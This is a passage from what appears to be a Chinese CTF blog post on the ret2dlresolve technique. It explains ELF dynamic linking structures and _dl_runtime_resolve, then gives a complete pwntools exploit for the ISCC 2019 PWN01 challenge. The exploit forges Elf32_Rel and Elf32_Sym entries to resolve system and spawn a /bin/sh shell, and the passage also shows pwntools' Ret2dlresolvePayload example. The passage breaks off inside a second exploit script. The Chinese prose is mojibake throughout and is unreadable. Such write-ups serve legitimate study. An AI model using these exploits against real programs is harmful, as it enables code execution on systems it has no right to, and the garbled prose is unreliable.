&quot;__libc_start_main&quot;</span><br><span class="line">LOAD:0804820C                            0&gt;</span><br><span class="line">LOAD:0804821C                 Elf32_Sym &lt;offset aIoStdinUsed - offset byte_804822C, \ ; &quot;_IO_stdin_used&quot;</span><br><span class="line">LOAD:0804821C                            offset _IO_stdin_used, 4, 11h, 0, 10h&gt;</span><br></pre></td></tr></table></figure></div>

<p>è¿™ä¸ªèŠ‚çš„æ¯ä¸€è¡Œä¹Ÿä»£è¡¨ç€ä¸€ä¸ªç»“æ„ä½“ï¼Œå®šä¹‰å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf32_Word    st_name; <span class="comment">//ç¬¦å·åï¼Œæ˜¯ç›¸å¯¹.dynstrèµ·å§‹çš„åç§»</span></span><br><span class="line">  Elf32_Addr    st_value;</span><br><span class="line">  Elf32_Word    st_size;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_info; <span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå®ƒæ˜¯0x12</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">char</span> st_other;</span><br><span class="line">  Elf32_Section st_shndx;</span><br><span class="line">&#125;Elf32_Sym; <span class="comment">//å¯¹äºå¯¼å…¥å‡½æ•°ç¬¦å·è€Œè¨€ï¼Œå…¶ä»–å­—æ®µéƒ½æ˜¯0</span></span><br></pre></td></tr></table></figure></div>

<p>é’ˆå¯¹å¯¼å…¥å‡½æ•°æ¥è¯´ï¼Œæ¯”è¾ƒä¸»è¦çš„æ˜¯ st_nameï¼Œå®ƒæŒ‡å‘äº†å½“å‰ç¬¦å·åœ¨ .dynstr èŠ‚ä¸­çš„åç§»é‡ã€‚</p>
<h2 id="dynstr-èŠ‚"><a href="#dynstr-èŠ‚" class="headerlink" title=".dynstr èŠ‚"></a>.dynstr èŠ‚</h2><p>è¿™ä¸ªèŠ‚åœ¨ IDA ä¸­ç»“æ„å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">LOAD:0804822C ; ELF String Table</span><br><span class="line">LOAD:0804822C byte_804822C    db 0                    ; DATA XREF: LOAD:080481DCâ†‘o</span><br><span class="line">LOAD:0804822C                                         ; LOAD:080481ECâ†‘o ...</span><br><span class="line">LOAD:0804822D aLibcSo6        db &#x27;libc.so.6&#x27;,0</span><br><span class="line">LOAD:08048237 aIoStdinUsed    db &#x27;_IO_stdin_used&#x27;,0   ; DATA XREF: LOAD:0804821Câ†‘o</span><br><span class="line">LOAD:08048246 aRead           db &#x27;read&#x27;,0             ; DATA XREF: LOAD:080481DCâ†‘o</span><br><span class="line">LOAD:0804824B aMemcpy         db &#x27;memcpy&#x27;,0           ; DATA XREF: LOAD:080481ECâ†‘o</span><br><span class="line">LOAD:08048252 aLibcStartMain  db &#x27;__libc_start_main&#x27;,0</span><br><span class="line">LOAD:08048252                                         ; DATA XREF: LOAD:0804820Câ†‘o</span><br><span class="line">LOAD:08048264 aGlibc20        db &#x27;GLIBC_2.0&#x27;,0</span><br><span class="line">LOAD:0804826E aGmonStart      db &#x27;__gmon_start__&#x27;,0   ; DATA XREF: LOAD:080481FCâ†‘o</span><br></pre></td></tr></table></figure></div>

<p>æ²¡æœ‰ç»“æ„ä½“å®šä¹‰ï¼Œè¿™ä¸ªèŠ‚çš„æ•°æ®å…¨éƒ½æ˜¯å­—ç¬¦ä¸²ï¼Œä¸¤ä¸¤ä¹‹é—´ç”¨ â€˜\x00â€™ åˆ†å‰²ï¼Œè€Œä¸”å¼€å¤´å’Œç»“å°¾éƒ½æ˜¯ â€˜\x00â€™ã€‚</p>
<p>å¦‚æœå°†ä»¥ä¸Šä»‹ç»çš„ç»“æ„ç”¨ä¸€å¼ å›¾ç‰‡è¡¨ç¤º</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ret2dlresolve3.png"
                     
                ><br>å‡ ç‚¹æ³¨æ„ï¼š</p>
<ol>
<li>r_info æŒ‡çš„æ˜¯å¯¹åº”çš„ç»“æ„ä½“åœ¨ .dynsym èŠ‚ä¸­çš„<strong>ä¸‹æ ‡</strong>(å¹¶ä¸å®Œå…¨æ˜¯ï¼Œä¸€ä¼šå†è®¨è®º)</li>
<li>st_name æŒ‡çš„æ˜¯å¯¹åº”çš„å­—ç¬¦ä¸²åœ¨ .dynstr èŠ‚ä¸­çš„<strong>åç§»é‡</strong>ï¼Œä¾‹å¦‚ .dynstr èŠ‚å¤´éƒ¨åœ°å€ä¸º 0x0804822Cï¼Œç›®æ ‡å­—ç¬¦ä¸²çš„åœ°å€æ˜¯ 0x08048246ï¼Œé‚£ä¹ˆ st_name &#x3D; 0x08048246 - 0x0804822C &#x3D; 26</li>
</ol>
<h2 id="ç¬¬ä¸€æ¬¡è°ƒç”¨å¯¼å…¥å‡½æ•°å‘ç”Ÿäº†ä»€ä¹ˆ"><a href="#ç¬¬ä¸€æ¬¡è°ƒç”¨å¯¼å…¥å‡½æ•°å‘ç”Ÿäº†ä»€ä¹ˆ" class="headerlink" title="ç¬¬ä¸€æ¬¡è°ƒç”¨å¯¼å…¥å‡½æ•°å‘ç”Ÿäº†ä»€ä¹ˆ"></a>ç¬¬ä¸€æ¬¡è°ƒç”¨å¯¼å…¥å‡½æ•°å‘ç”Ÿäº†ä»€ä¹ˆ</h2><p>å…³äº ELF æ ¼å¼æˆ–è€…å„ç§èŠ‚çš„è¯¦ç»†ä»‹ç»æˆ‘ä»¬è¿™é‡Œä¸æ¶‰åŠäº†ï¼Œä¸»è¦æ¥çœ‹çœ‹å½“ç¬¬ä¸€è°ƒç”¨æŸä¸ªç³»ç»Ÿå‡½æ•°çš„æ—¶å€™å‘ç”Ÿäº†ä»€ä¹ˆã€‚</p>
<p>åœ¨ linux ä¸‹éšä¾¿æ‰¾ä¸€ä¸ªå¯æ‰§è¡Œç¨‹åºï¼Œç”¨ gdb æ‰“å¼€æ‰¾åˆ°ä¸€ä¸ªç³»ç»Ÿå‡½æ•°å•æ­¥è·Ÿè¸ªã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ret2dlresolve.png"
                     
                ><br>ä»¥ read å‡½æ•°ä¸ºä¾‹ï¼Œå•æ­¥è·Ÿè¿›ã€‚</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ret2dlresolve2.png"
                     
                ><br>çº¢è‰²æ–¹æ¡†åœˆå‡ºçš„å°±æ˜¯ä¸»è¦ä»£ç ï¼Œç¬¬ä¸€æ¬¡è°ƒç”¨ read å‡½æ•°ï¼Œé¦–å…ˆä¼š jmp åˆ° GOT è¡¨ä¸­å¯»æ‰¾åœ°å€ï¼Œä½†æ˜¯æ­¤æ—¶ read å‡½æ•°è¿˜æ²¡æœ‰è¢«ç»‘å®šåˆ° GOT è¡¨ä¸­ã€‚</p>
<p>ç„¶åæ‰§è¡Œäº†</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">push   0</span><br><span class="line">push   dword ptr [_GLOBAL_OFFSET_TABLE_+4] &lt;0x804a004&gt;</span><br></pre></td></tr></table></figure></div>

<p>ä¸¤æ­¥æ“ä½œï¼Œæœ€åé€šè¿‡ jmp æŒ‡ä»¤è·³è½¬åˆ° _dl_runtime_resolve ç»§ç»­æ‰§è¡Œã€‚å®é™…ä¸Šè¿™ä¸¤å¥ push å°±æ˜¯å°†å‡½æ•°çš„å‚æ•°å…¥æ ˆï¼Œè°ƒç”¨å‡½æ•°åŸå‹ä¸º dl_runtime_resolve(link_map,0Ã—0)ï¼Œè¿™ä¸ªå‡½æ•°å°±ä¼šè¿›è¡Œä¸€ç³»åˆ—æ“ä½œè§£æå‡º read å‡½æ•°çš„åœ°å€ï¼Œå°†åœ°å€å†™å…¥ read çš„ GOT è¡¨ä¸­ï¼Œç„¶åå°†æ§åˆ¶æƒäº¤ç»™ read ç»§ç»­æ‰§è¡Œã€‚</p>
<h2 id="dl-runtime-resolve"><a href="#dl-runtime-resolve" class="headerlink" title="_dl_runtime_resolve"></a>_dl_runtime_resolve</h2><p>æˆ‘ä»¬ç®€å•äº†è§£ä¸€ä¸‹è¿™ä¸ªå‡½æ•°çš„æ‰§è¡Œè¿‡ç¨‹ï¼Œå®ƒçš„ä»£ç æ˜¯ç”±æ±‡ç¼–ç¼–å†™çš„ï¼Œå†…éƒ¨ä¸»è¦è°ƒç”¨äº† _dl_fixup å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°çš„å®ç°åœ¨ glibc&#x2F;elf&#x2F;dl-runtime.c ä¸­ï¼Œæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥é˜…è¯»æºä»£ç ã€‚</p>
<p>å½“ç¨‹åºè°ƒç”¨ _dl_runtime_resolve çš„æ—¶å€™ï¼Œè¿™ä¸ªå‡½æ•°é¦–å…ˆæ ¹æ® linkmap å®šä½ .dynamic èŠ‚çš„åœ°å€ï¼Œå¹¶ä»ä¸­å–å‡º .dynstrã€.dynsymã€.rel.plt è¿™ä¸‰ä¸ªèŠ‚çš„æŒ‡é’ˆï¼Œç„¶ååˆ©ç”¨ .rel.plt å¤´éƒ¨æŒ‡é’ˆå’Œä¼ å…¥çš„ç¬¬äºŒä¸ªå‚æ•° offset å®šä½ .rel.plt ä¸­çš„ Elf32_Rel ç»“æ„ä½“ï¼Œä¾‹å¦‚ä¸Šé¢çš„ä¾‹å­ä¼ å…¥çš„åç§»é‡æ˜¯ 0ï¼Œåœ¨ .rel.plt ä¸­æ‰¾åˆ°é›¶å·ç»“æ„ä½“å°±æ˜¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Elf32_Rel &lt;804A00Ch, 107h&gt; ; R_386_JMP_SLOT read</span><br></pre></td></tr></table></figure></div>

<p>ä¸Šé¢è¯´äº†è¿™ä¸ªç»“æ„ä½“åŒ…å«ä¸¤ä¸ªæˆå‘˜ï¼Œç¬¬ä¸€ä¸ªæ˜¯æŒ‡å‘ GOT è¡¨çš„æŒ‡é’ˆ r_offset ï¼Œè€Œç¬¬äºŒä¸ª r_info çš„åˆ©ç”¨è§„åˆ™ä¸º <code>r_info &gt;&gt; 8</code>ä½œä¸º<code>.dynsym</code>çš„ä¸‹æ ‡ï¼Œæ±‚å‡ºå½“å‰å‡½æ•°çš„ç¬¦å·è¡¨é¡¹<code>Elf32_Sym</code>çš„æŒ‡é’ˆï¼Œä¹Ÿå°±æ˜¯è¯´ 0x107 &gt;&gt; 8 &#x3D; 0x1 ä½œä¸º .dynsym èŠ‚ä¸­çš„ä¸‹æ ‡ï¼Œå–å¾— Elf32_Sym ç»“æ„ä½“ã€‚åœ¨æœ¬ä¾‹ä¸­å–åˆ°çš„å°±æ˜¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Elf32_Sym &lt;offset aRead - offset byte_804822C, 0, 0, 12h, 0, 0&gt; ; &quot;read&quot;</span><br></pre></td></tr></table></figure></div>

<p>(æ³¨æ„ï¼š.dynsym èŠ‚çš„ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯ 0)</p>
<p>å–å¾— Elf32_Sym ç»“æ„ä¹‹åï¼Œä¼šæ ¹æ® st_name æŒ‡é’ˆä» .dynstr èŠ‚ä¸­æ‰¾åˆ°å¯¹åº”çš„å­—ç¬¦ä¸²ï¼Œè¿™ä¸ª st_name è¡¨ç¤ºçš„æ˜¯å­—ç¬¦ä¸²ç›¸å¯¹ .dynstr èŠ‚èµ·å§‹åœ°å€çš„åç§»é‡ã€‚ä¾‹å¦‚æœ¬ä¾‹ä¸­ st_name &#x3D; offset aRead - offset byte_804822C &#x3D; 0x08048246 - 0x804822C &#x3D; 26</p>
<p>å½“æ‰¾åˆ°äº†å­—ç¬¦ä¸²ä¹‹åï¼Œä¼šåœ¨ libc ä¸­æŸ¥æ‰¾è¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œå¹¶å°†åœ°å€èµ‹å€¼ç»™ Elf32_Rel çš„ r_offset æˆå‘˜(ä¹Ÿå°±æ˜¯æŒ‡å‘ GOT è¡¨çš„æŒ‡é’ˆ)ã€‚</p>
<p>æœ€å _dl_runtime_resolve å°†æ§åˆ¶æƒè½¬ç§»ç»™è§£æå‡ºæ¥çš„å‡½æ•°ï¼Œå®Œæˆå¯¹åº”çš„åŠŸèƒ½ã€‚</p>
<p>æ€»ç»“ä¸€ä¸‹æµç¨‹</p>
<ol>
<li>æ ¹æ®ä¼ å…¥çš„ link_map æ‰¾åˆ° .dynamic èŠ‚ï¼Œå¹¶å–å‡º .dynstrã€.dynsymã€.rel_plt ä¸‰ä¸ªèŠ‚ã€‚</li>
<li>æ ¹æ®ä¼ å…¥çš„ offset ä» .rel_plt ä¸­æ‰¾åˆ°å¯¹åº”çš„ Elf32_Rel ç»“æ„ä½“ã€‚</li>
<li>ä» Elf32_Rel ç»“æ„ä½“ä¸­æ‰¾åˆ° r_info æˆå‘˜ï¼Œæ ¹æ®è¿™ä¸ªæˆå‘˜çš„åç§»é‡(r_info &gt;&gt; 8) ä» .dynsym ä¸­æ‰¾åˆ° Elf32_Sym ç»“æ„ä½“ã€‚</li>
<li>ä» Elf32_Sym ç»“æ„ä½“ä¸­æ‰¾åˆ° st_name æˆå‘˜ï¼Œæ ¹æ®è¿™ä¸ªåç§»ä» .dynstr èŠ‚ä¸­æ‰¾åˆ°å¯¹åº”çš„å­—ç¬¦ä¸²ã€‚</li>
<li>æ ¹æ®æ‰¾åˆ°çš„å­—ç¬¦ä¸²åœ¨ libc ä¸­æœç´¢å¯¹åº”çš„å‡½æ•°åœ°å€ï¼Œå¹¶å›å¡«åˆ° Elf32_Rel çš„ r_offset æˆå‘˜ä¸­ã€‚</li>
<li>å°†æ§åˆ¶æƒäº¤ç»™è§£æå‡ºæ¥çš„å‡½æ•°ã€‚</li>
</ol>
<h2 id="æ”»å‡»æ€è·¯"><a href="#æ”»å‡»æ€è·¯" class="headerlink" title="æ”»å‡»æ€è·¯"></a>æ”»å‡»æ€è·¯</h2><p>å¦‚æœç¨‹åºæ²¡æœ‰å¼€å¯ RELRO ä¿æŠ¤ï¼Œå³ checksec æ˜¾ç¤º No RELRO çš„æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ä¿®æ”¹ .dynamic èŠ‚çš„ .dynstr æŒ‡é’ˆï¼Œå°†å®ƒæŒ‡å‘ä¸€å—å¯æ§å†…å­˜ï¼Œç„¶ååœ¨å¯¹åº”çš„ä½ç½®ä¸Šé¢ä¼ªé€ å¥½æƒ³è¦è§£æå‡ºæ¥çš„å‡½æ•°åï¼Œä¾‹å¦‚ â€œsystemâ€ã€‚</p>
<p>ä¸Šé¢çš„æ–¹æ³•æ˜¯æœ€ç®€å•çš„ï¼Œä½†æ˜¯å¾ˆå¤šæƒ…å†µä¸‹é¢˜ç›®éƒ½ä¼šå¼€å¯éƒ¨åˆ† RELRO ä¿æŠ¤ï¼Œä¸èƒ½ä¿®æ”¹ .dynamic çš„ .dynstr æŒ‡é’ˆ(æ²¡æœ‰å†™æƒé™)ï¼Œæ­¤æ—¶è¦ç”¨åˆ°å¦ä¸€ç§æ–¹æ³•ï¼Œé‚£å°±æ˜¯æ§åˆ¶ _dl_runtime_resolve çš„ç¬¬äºŒä¸ªå‚æ•°ã€‚</p>
<p>é€šè¿‡ä¸Šé¢ä»‹ç»çš„å‡½æ•°æµç¨‹ï¼Œå¯ä»¥å‘ç°å‡½æ•°çš„è§£æé“¾å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">_dl_runtime_resolve(linkmap, offset) -&gt; Elf32_Rel -&gt; r_info -&gt; Elf32_Sym -&gt; st_name -&gt; string -&gt; r_offset</span><br></pre></td></tr></table></figure></div>

<p>å½“è¿›è¡Œ ROP ç­‰æ“ä½œçš„æ—¶å€™ï¼Œæ„é€ ä¸€ä¸ªå¾ˆå¤§çš„ offsetï¼Œå¹¶ä¸”åœ¨å¯æ§çš„å†…å­˜ç©ºé—´ä¼ªé€ ä¸€ä¸ª Elf32_Rel ç»“æ„ä½“ï¼Œç”±äº libc æºä»£ç ä¸­æ²¡æœ‰æ£€æŸ¥ offset æ˜¯å¦åˆæ³•(å–å¾—è¿™ä¸ªç»“æ„ä½“çš„ç®—æ³•æ˜¯ .rel_plt + offset)ï¼Œå½“æ ¹æ®æˆ‘ä»¬ä¼ªé€ çš„ offset è·å– Elf32_Rel çš„æ—¶å€™å°±ä¼šè½åœ¨ä¼ªé€ çš„ç»“æ„ä½“å†…éƒ¨ã€‚</p>
<p>ç´§æ¥ç€åœ¨ä¼ªé€ çš„ç»“æ„ä½“ä¸­æ„é€ å¥½ r_info åç§»é‡ï¼ŒåŒæ ·çš„ï¼Œè¿™ä¸ªåç§»é‡ä¹Ÿå¯ä»¥ä¼ªé€ ä¸€ä¸ªè¾ƒå¤§çš„å€¼ï¼Œä½¿å¾— Elf32_Sym ç»“æ„ä½“ä¹Ÿè½åœ¨å¯æ§å†…å­˜åŒºåŸŸã€‚</p>
<p>åœ¨ä¼ªé€ çš„ Elf32_Sym ç»“æ„ä½“ä¸­ä¼ªé€  st_nameï¼Œå¹¶åœ¨ç›®æ ‡åœ°å€å†™å…¥æƒ³è¦è§£æçš„å‡½æ•°åã€‚</p>
<p>å°†ä¸Šé¢ä¸‰æ­¥æ“ä½œç”¨å›¾ç‰‡è¡¨ç¤º</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/img/ret2dlresolve4.png"
                     
                ><br>è¿™ä¸€æ”»å‡»æµç¨‹çš„æ ¸å¿ƒç‚¹åœ¨äºæ§åˆ¶å¥½å„ä¸ªä½ç½®çš„åç§»é‡ï¼Œå¯èƒ½éœ€è¦å¤šæ¬¡è°ƒè¯•æ‰èƒ½ç¡®å®šç²¾ç¡®çš„åç§»ã€‚</p>
<h2 id="ä¸¾ä¸ªæ —å­"><a href="#ä¸¾ä¸ªæ —å­" class="headerlink" title="ä¸¾ä¸ªæ —å­"></a>ä¸¾ä¸ªæ —å­</h2><p>ISCC 2019 çš„ PWN01ï¼Œè¿™é“é¢˜æ²¡æœ‰ç»™è¾“å‡ºå‡½æ•°ï¼Œåªæœ‰ä¸€ä¸ªæ ˆæº¢å‡ºæ¼æ´ï¼Œå¹¶ä¸”å°†æ•°æ®å¡«å†™åˆ°äº† bss æ®µã€‚</p>
<p>ä¸»è¦ä»£ç å¦‚ä¸‹</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> dest; <span class="comment">// [esp+0h] [ebp-16h]</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [esp+Ah] [ebp-Ch]</span></span><br><span class="line">  <span class="type">int</span> *v6; <span class="comment">// [esp+Eh] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = &amp;argc;</span><br><span class="line">  n = read(<span class="number">0</span>, &amp;buf, <span class="number">0xF4240</span>u);</span><br><span class="line">  <span class="built_in">memcpy</span>(&amp;dest, &amp;buf, n);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>ç°å°†æ•°æ®è¯»å…¥ bss æ®µï¼Œç„¶åæ‹·è´åˆ°æ ˆä¸Šï¼Œå¯¼è‡´æ ˆæº¢å‡ºã€‚</p>
<p>æŒ‰ç…§æ”»å‡»æ€è·¯ï¼Œæˆ‘ä»¬åªéœ€è¦æ„é€ å¥½ ROP é“¾ä»¥åŠä¸‰ä¸ª fake ç»“æ„ä½“å³å¯å®Œæˆåˆ©ç”¨ã€‚</p>
<p>æ„é€  ROP åˆ©ç”¨é“¾ï¼Œå°†è¿”å›åœ°å€åŠ«æŒåˆ° plt[0] å³ push linkmap çš„ä½ç½®ï¼ŒåŒæ—¶ä¼ªé€ å¥½ä¸‰ä¸ªç»“æ„ï¼šElf32_Relã€Elf32_Sym å’Œæœ‰æ•ˆçš„å­—ç¬¦ä¸² â€œsystemâ€ï¼Œå½“æ‰§è¡Œå®Œ _dl_runtime_resolve ä¹‹åï¼Œå°±ä¼šå°† system çš„åœ°å€å¡«å……åˆ° read çš„ got è¡¨ä¸­ã€‚</p>
<p>å®Œæ•´ EXP å¦‚ä¸‹</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./pwn01&quot;</span></span><br><span class="line">ip = <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">port =  <span class="number">10000</span></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">libc_ver = <span class="string">&quot;2.23&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> libc_ver == <span class="string">&quot;2.23&quot;</span>:</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">elif</span> libc_ver == <span class="string">&quot;2.27&quot;</span>:</span><br><span class="line">    libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    log.warning(<span class="string">&quot;Unknown libc ver!&quot;</span>)</span><br><span class="line">    exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#context(log_level=&quot;DEBUG&quot;, arch=&quot;amd64&quot;, os=&quot;linux&quot;)</span></span><br><span class="line">context(log_level=<span class="string">&quot;DEBUG&quot;</span>, arch=<span class="string">&quot;i386&quot;</span>, os=<span class="string">&quot;linux&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">if</span> local == <span class="number">0</span>:</span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sleep(<span class="number">5</span>)</span><br><span class="line">buf_addr = <span class="number">0x0804A040</span></span><br><span class="line">padding = <span class="string">&quot;/bin/sh\x00&quot;</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">6</span>    <span class="comment"># padding until pop ecx</span></span><br><span class="line">fake_ecx = p32(buf_addr + <span class="number">0x300</span>)</span><br><span class="line">padding2 = <span class="string">&quot;\x00&quot;</span> * (<span class="number">0x300</span> - <span class="number">22</span>)</span><br><span class="line">ret_to_dlresolve = p32(<span class="number">0x80482f0</span>)</span><br><span class="line">fake_offset = p32(buf_addr - <span class="number">0x080482B4</span> + <span class="built_in">len</span>(padding) + <span class="built_in">len</span>(fake_ecx) + <span class="built_in">len</span>(padding2) + <span class="built_in">len</span>(ret_to_dlresolve) + <span class="number">20</span>)</span><br><span class="line">padding3 = p32(buf_addr) + p32(buf_addr) * <span class="number">3</span></span><br><span class="line">fake_r_offset = p32(<span class="number">0x804A00C</span>)</span><br><span class="line">fake_r_info = p32(<span class="number">0x21907</span>)</span><br><span class="line">fake_st_name = p32(<span class="number">0x2140</span>)</span><br><span class="line">fake_Elf32_Sym = p32(<span class="number">0</span>) * <span class="number">2</span> + p32(<span class="number">0x12</span>) + <span class="string">&quot;system\x00&quot;</span></span><br><span class="line">bin_sh = <span class="string">&quot;/bin/sh\x00&quot;</span></span><br><span class="line">payload = padding + fake_ecx + padding2 + ret_to_dlresolve + fake_offset + padding3 + fake_r_offset + fake_r_info + \</span><br><span class="line">          fake_st_name + fake_Elf32_Sym + bin_sh</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>

<p>æ³¨æ„ï¼Œè™½ç„¶è¯´ padding å¡«å……ä»€ä¹ˆéƒ½å¯ä»¥ï¼Œä½†æ˜¯å½“ç¨‹åºæ‰§è¡Œ system å‡½æ•°ä¸­çš„ execve æ—¶ï¼Œéœ€è¦æ»¡è¶³ä¸€äº›å¿…è¦çš„æ¡ä»¶ï¼Œç”±äºæˆ‘ä»¬å·²ç»å°†æ ˆå¸§è¿ç§»åˆ°äº† bss æ®µï¼Œæ‰€ä»¥ padding æœ€å¥½å¡«å……ä¸º â€˜\x00â€™ï¼Œå¦åˆ™åœ¨æ‰§è¡Œ execve çš„æ—¶å€™ä¼šç”±äºç¯å¢ƒä¸æ­£å¸¸å¯¼è‡´syscall æ‰§è¡Œå¤±è´¥ã€‚</p>
<h2 id="å†ä¸¾ä¸ªæ —å­"><a href="#å†ä¸¾ä¸ªæ —å­" class="headerlink" title="å†ä¸¾ä¸ªæ —å­"></a>å†ä¸¾ä¸ªæ —å­</h2><p>è¿™æ˜¯ 2020 å¹´é“ä¸‰çº¿ä¸Šèµ›çš„ä¸€é“ pwn é¢˜ï¼Œåˆ©ç”¨æ€è·¯ä¹Ÿæ˜¯ ret2dlresolveï¼Œæˆ‘ä»¬å¯ä»¥é€‰æ‹©æ›´ç®€å•çš„æ–¹å¼å»åˆ©ç”¨ï¼Œpwntools å†…éƒ¨é›†æˆäº† Ret2dlresolvePayload å·¥å…·ï¼Œå¯ä»¥ â€œä¸€é”®â€ å®ç°æ”»å‡»ã€‚</p>
<p>é¢˜ç›®ä¸‹è½½åœ°å€ï¼šé“¾æ¥ï¼š<a class="link"   href="https://pan.baidu.com/s/1hkzR87BY8wqDAm_3Z8KSYw" >https://pan.baidu.com/s/1hkzR87BY8wqDAm_3Z8KSYw<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>    æå–ç ï¼š5cac </p>
<p>å®˜æ–¹ä¾‹å­</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; context.binary = elf = ELF(pwnlib.data.elf.ret2dlresolve.get(&#x27;i386&#x27;))</span><br><span class="line">&gt;&gt;&gt; rop = ROP(context.binary)</span><br><span class="line">&gt;&gt;&gt; dlresolve = Ret2dlresolvePayload(elf, symbol=&quot;system&quot;, args=[&quot;echo pwned&quot;])</span><br><span class="line">&gt;&gt;&gt; rop.read(0, dlresolve.data_addr) # do not forget this step, but use whatever function you like</span><br><span class="line">&gt;&gt;&gt; rop.ret2dlresolve(dlresolve)</span><br><span class="line">&gt;&gt;&gt; raw_rop = rop.chain()</span><br><span class="line">&gt;&gt;&gt; print(rop.dump())</span><br><span class="line">0x0000:        0x80482e0 read(0, 0x804ae00)</span><br><span class="line">0x0004:        0x80484ea &lt;adjust @0x10&gt; pop edi; pop ebp; ret</span><br><span class="line">0x0008:              0x0 arg0</span><br><span class="line">0x000c:        0x804ae00 arg1</span><br><span class="line">0x0010:        0x80482d0 [plt_init] system(0x804ae24)</span><br><span class="line">0x0014:           0x2b84 [dlresolve index]</span><br><span class="line">0x0018:          b&#x27;gaaa&#x27; &lt;return address&gt;</span><br><span class="line">0x001c:        0x804ae24 arg0</span><br><span class="line">&gt;&gt;&gt; p = elf.process()</span><br><span class="line">&gt;&gt;&gt; p.sendline(fit(&#123;64+context.bytes*3: raw_rop, 200: dlresolve.payload&#125;))</span><br><span class="line">&gt;&gt;&gt; p.recvline()</span><br><span class="line">b&#x27;pwned\n&#x27;</span><br></pre></td></tr></table></figure></div>

<p>æ¯”è¾ƒé‡è¦çš„æ˜¯ Ret2dlresolvePayloadï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ç›®æ ‡æ–‡ä»¶çš„ ELF å¯¹è±¡ï¼Œç¬¬äºŒä¸ªæ˜¯æƒ³è¦è§£æçš„å‡½æ•°åï¼Œç¬¬ä¸‰ä¸ªæ˜¯å‡½æ•°å‚æ•°ã€‚</p>
<p>é’ˆå¯¹è¿™é“é¢˜ï¼Œå…ˆä¾ç…§å®˜æ–¹çš„ä¾‹å­å¾—åˆ° payloadï¼Œä½†æ˜¯åœ¨æ‰§è¡Œ system å‡½æ•°çš„æ—¶å€™å‘ç°ç”±äº env å‚æ•°ä¸ä¸º 0ï¼Œä¼šå¯¼è‡´æ‰§è¡Œå¤±è´¥ï¼Œæ‰€ä»¥å°†è¾“å‡ºçš„ payload ä¸­å ä½çš„å­—èŠ‚æ”¹æˆ \x00 å³å¯ã€‚</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.binary = elf = ELF(<span class="string">&quot;./readme2&quot;</span>)</span><br><span class="line">p = elf.process()</span><br><span class="line">payload = <span 